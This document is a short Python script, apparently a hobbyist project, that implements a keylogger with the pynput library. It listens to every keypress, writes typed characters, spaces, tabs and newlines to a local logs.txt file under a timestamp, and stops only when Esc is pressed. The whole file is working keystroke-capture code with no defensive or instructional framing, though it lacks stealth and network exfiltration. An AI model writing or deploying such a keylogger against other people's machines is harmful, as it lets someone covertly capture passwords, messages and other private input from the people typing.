
import pynput
import json
from pynput.keyboard import Key, Listener
from datetime import datetime

keys = []
t = 0
keys.append(datetime.now().strftime("\n\n%d/%m/%Y %H:%M:%S\n"))
print(keys)


def pressed(key):
    global keys, t
    keys.append(key)
    t+=1
    if t > 1 :
        t = 0
        write(keys)
        keys=[]

def write(keys):
    with open('logs.txt', 'a') as log :
        for key in keys :
            if key == Key.enter:
                log.write("\n")
            elif key == Key.tab:
                log.write("\t")
            elif key == Key.space:
                log.write(" ")
            elif str(key).find("Key") != -1 :
                pass
            else:
                log.write(str(key).strip("'"))
def released(key):
    if(key == Key.esc):
        return False

with Listener(on_press=pressed, on_release=released) as listener :
    listener.join()
